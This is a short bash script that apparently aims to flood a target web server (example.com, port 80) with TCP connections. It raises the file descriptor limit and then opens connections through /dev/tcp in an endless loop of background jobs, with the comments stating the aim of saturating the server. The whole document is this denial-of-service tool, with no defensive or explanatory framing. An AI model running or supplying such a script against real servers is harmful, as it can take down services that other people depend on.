#!/bin/bash

# Set the maximum number of open file descriptors
ulimit -n 10000

# Set the target server's address
server_address="example.com"

# Continuously send connection requests until all open ports are saturated
while true; do
  # Send a request to connect to the server
  (echo > /dev/tcp/$server_address/80) &
done
